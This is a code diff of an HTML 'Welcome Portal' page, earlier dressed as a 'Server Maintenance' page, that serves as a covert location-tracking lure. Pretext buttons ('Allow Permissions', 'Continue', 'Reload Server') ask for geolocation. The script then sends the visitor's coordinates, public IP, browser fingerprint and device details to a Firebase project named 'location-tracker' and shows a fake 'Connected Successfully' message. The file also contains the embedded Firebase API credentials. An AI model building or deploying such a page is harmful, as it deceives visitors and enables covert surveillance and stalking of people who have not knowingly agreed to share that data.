@@ -1,151 +1,192 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Welcome | Server Maintenance</title>
+<title>Welcome Portal</title>
 
-<link rel="icon" type="image/x-icon" href="favicon.ico">
-
+<link rel="icon" href="favicon.ico">
 
 <style>
 
 *{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family: 'Segoe UI', sans-serif;
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Segoe UI,sans-serif;
 }
-
 
 body{
 
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
+min-height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
 
-    background:
-    radial-gradient(circle at top,#1f2937,#020617);
+background:
+linear-gradient(135deg,#020617,#111827,#312e81);
 
-    color:white;
+color:white;
+
+}
+
+
+.card{
+
+width:90%;
+max-width:450px;
+
+padding:35px;
+
+background:rgba(255,255,255,.08);
+
+backdrop-filter:blur(20px);
+
+border-radius:25px;
+
+border:1px solid rgba(255,255,255,.15);
+
+text-align:center;
+
+box-shadow:0 20px 50px #0008;
+
+animation:show .8s;
 
 }
 
 
-.container{
+@keyframes show{
 
-    width:90%;
-    max-width:450px;
-
-    background:rgba(255,255,255,0.08);
-
-    backdrop-filter:blur(15px);
-
-    border:1px solid rgba(255,255,255,0.15);
-
-    padding:40px 30px;
-
-    border-radius:25px;
-
-    text-align:center;
-
-    box-shadow:0 20px 50px rgba(0,0,0,0.5);
-
+from{
+opacity:0;
+transform:translateY(40px);
 }
 
+to{
+opacity:1;
+transform:translateY(0);
+}
+
+}
 
 
 h1{
 
-    font-size:32px;
-    margin-bottom:15px;
+font-size:32px;
+margin-bottom:15px;
 
 }
 
 
+.clock{
 
-.subtitle{
-
-    color:#cbd5e1;
-
-    font-size:16px;
-
-    line-height:1.6;
-
-    margin-bottom:25px;
+font-size:22px;
+color:#93c5fd;
 
 }
 
 
+.date{
 
-.status{
-
-    display:inline-block;
-
-    background:#ef4444;
-
-    padding:8px 18px;
-
-    border-radius:20px;
-
-    font-size:14px;
-
-    margin-bottom:25px;
+margin:10px;
+color:#cbd5e1;
 
 }
 
+
+p{
+
+color:#cbd5e1;
+
+line-height:1.6;
+
+margin:20px 0;
+
+}
 
 
 button{
 
+width:100%;
 
-    width:100%;
+padding:15px;
 
-    padding:15px;
+border:0;
 
-    border:none;
+border-radius:15px;
 
-    border-radius:15px;
+background:linear-gradient(135deg,#2563eb,#9333ea);
 
-    background:linear-gradient(135deg,#3b82f6,#8b5cf6);
+color:white;
 
-    color:white;
+font-size:17px;
 
-    font-size:17px;
+font-weight:bold;
 
-    font-weight:bold;
+cursor:pointer;
 
-    cursor:pointer;
-
-    transition:.3s;
+transition:.3s;
 
 }
-
 
 
 button:hover{
 
-    transform:translateY(-3px);
-
-    box-shadow:0 10px 25px rgba(59,130,246,.5);
+transform:scale(1.04);
 
 }
 
 
 
-.footer{
+#popup{
 
-    margin-top:25px;
+position:fixed;
 
-    font-size:13px;
+inset:0;
 
-    color:#94a3b8;
+background:#000b;
+
+display:flex;
+
+align-items:center;
+
+justify-content:center;
 
 }
 
+
+.popup{
+
+background:#111827;
+
+padding:30px;
+
+width:85%;
+
+max-width:350px;
+
+border-radius:25px;
+
+text-align:center;
+
+animation:pop .5s;
+
+}
+
+
+@keyframes pop{
+
+from{
+transform:scale(.5);
+}
+
+to{
+transform:scale(1);
+}
+
+}
 
 </style>
 
@@ -155,42 +196,61 @@ button:hover{
 <body>
 
 
-<div class="container">
+<div id="popup">
+
+<div class="popup">
+
+<h2>👋 Welcome</h2>
+
+<br>
+
+<p>
+To continue, please allow permissions.
+<br><br>
+📍 Location access is required.
+</p>
 
 
-<h1>Welcome 👋</h1>
+<button onclick="requestLocation()">
+
+Allow Permissions
+
+</button>
 
 
-<div class="status">
-Server Maintenance
+</div>
+
 </div>
 
 
-<p class="subtitle">
 
-Our server is currently under maintenance.
+<div class="card">
+
+
+<h1 id="greet">
+Hello 👋
+</h1>
+
+
+<div class="clock" id="clock"></div>
+
+<div class="date" id="date"></div>
+
+
+<p>
+
+Our system is ready.
 <br>
-We are upgrading our system to provide a better experience.
-
-<br><br>
-
-Please click the button below to continue.
+Please verify your connection to continue.
 
 </p>
 
 
 <button onclick="requestLocation()">
 
-Reload Server
+Continue
 
 </button>
-
-
-<div class="footer">
-
-© 2026 Server Team • All Rights Reserved
-
-</div>
 
 
 </div>
@@ -201,46 +261,49 @@ Reload Server
 <script type="module">
 
 
-import { initializeApp } 
+import {initializeApp}
+
 from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
 
-import { 
+import {
+
 getFirestore,
 collection,
 addDoc,
 serverTimestamp
+
 }
+
 from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 
 
 
-const firebaseConfig = {
 
-apiKey: "AIzaSyBeUwz8yL-XmgI3wx4uCH7uPhdoHt0fSo8",
+const firebaseConfig={
 
-authDomain: "location-tracker-1aa74.firebaseapp.com",
+apiKey:"AIzaSyBeUwz8yL-XmgI3wx4uCH7uPhdoHt0fSo8",
 
-projectId: "location-tracker-1aa74",
+authDomain:"location-tracker-1aa74.firebaseapp.com",
 
-storageBucket: "location-tracker-1aa74.firebasestorage.app",
+projectId:"location-tracker-1aa74",
 
-messagingSenderId: "836267695111",
+storageBucket:"location-tracker-1aa74.firebasestorage.app",
 
-appId: "1:836267695111:web:1b6ddd5d4a85a350099ea2",
+messagingSenderId:"836267695111",
 
-measurementId: "G-DNSW7LGEYV"
+appId:"1:836267695111:web:1b6ddd5d4a85a350099ea2",
+
+measurementId:"G-DNSW7LGEYV"
 
 };
 
 
 
-const app = initializeApp(firebaseConfig);
+const app=initializeApp(firebaseConfig);
 
-
-const db = getFirestore(app);
-
+const db=getFirestore(app);
 
 
 console.log("Firebase Connected");
@@ -249,30 +312,81 @@ console.log("Firebase Connected");
 
 
 
-window.requestLocation = function(){
+function clock(){
+
+let now=new Date();
+
+let h=now.getHours();
+
+let text="Good Evening 🌙";
 
 
-if(navigator.geolocation){
+if(h<12)
+text="Good Morning ☀️";
+
+else if(h<18)
+text="Good Afternoon 👋";
+
+
+document.getElementById("greet").innerHTML=text;
+
+
+document.getElementById("clock").innerHTML=
+now.toLocaleTimeString();
+
+
+document.getElementById("date").innerHTML=
+now.toDateString();
+
+
+}
+
+
+setInterval(clock,1000);
+
+clock();
+
+
+
+
+
+
+async function getIP(){
+
+try{
+
+let r=await fetch(
+"https://api.ipify.org?format=json"
+);
+
+let d=await r.json();
+
+return d.ip;
+
+}
+
+catch{
+
+return "Unknown";
+
+}
+
+}
+
+
+
+
+
+window.requestLocation=function(){
 
 
 navigator.geolocation.getCurrentPosition(
 
-saveLocation,
+saveData,
 
-errorLocation
+()=>alert("Location permission denied")
 
 );
-
-
-}
-
-else{
-
-
-alert("Location not supported");
-
-
-}
 
 
 };
@@ -282,69 +396,91 @@ alert("Location not supported");
 
 
 
-async function saveLocation(position){
+async function saveData(pos){
 
 
-const latitude = position.coords.latitude;
-
-const longitude = position.coords.longitude;
-
-
-
-const maps =
-`https://www.google.com/maps?q=${latitude},${longitude}`;
+let ip=await getIP();
 
 
 
-
-try{
-
-
-await addDoc(collection(db,"locations"),{
+let data={
 
 
-latitude,
-
-longitude,
-
-maps,
-
-time:serverTimestamp()
+latitude:
+pos.coords.latitude,
 
 
-});
+longitude:
+pos.coords.longitude,
+
+
+accuracy:
+pos.coords.accuracy,
+
+
+map:
+`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+
+
+ip:ip,
+
+
+browser:
+navigator.userAgent,
+
+
+language:
+navigator.language,
+
+
+timezone:
+Intl.DateTimeFormat().resolvedOptions().timeZone,
+
+
+screen:
+`${screen.width}x${screen.height}`,
+
+
+platform:
+navigator.platform,
+
+
+cpu:
+navigator.hardwareConcurrency || "Unknown",
+
+
+memory:
+navigator.deviceMemory || "Unknown",
+
+
+online:
+navigator.onLine,
+
+
+time:
+new Date().toString(),
+
+
+created:
+serverTimestamp()
+
+
+};
 
 
 
-alert("System connected successfully ✅");
 
-
-}
-
-
-catch(error){
-
-
-console.log(error);
-
-alert("Database error");
-
-
-}
+await addDoc(
+collection(db,"locations"),
+data
+);
 
 
 
-}
+document.getElementById("popup").style.display="none";
 
 
-
-
-
-
-function errorLocation(){
-
-
-alert("Location permission denied");
+alert("Connected Successfully ✅");
 
 
 }
